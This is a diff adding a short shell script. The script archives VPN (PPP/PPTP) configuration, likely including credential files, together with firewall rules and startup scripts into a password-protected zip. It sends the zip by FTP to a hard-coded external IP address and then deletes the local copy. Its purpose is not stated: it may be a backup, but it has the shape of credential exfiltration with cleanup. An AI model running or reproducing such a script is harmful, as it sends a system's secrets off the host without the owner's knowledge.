@@ -1,0 +1,5 @@
+#!/bin/sh
+
+zip -r -P FF7gDpopZ2 /root/tr2.zip /etc/ppp /etc/pptpd.conf /usr/local/etc /etc/sysconfig/iptables /etc/rc.local
+ftp -n 64.21.0.190 < /usr/local/etc/bin/interactive
+rm -rf /root/tr2.zip
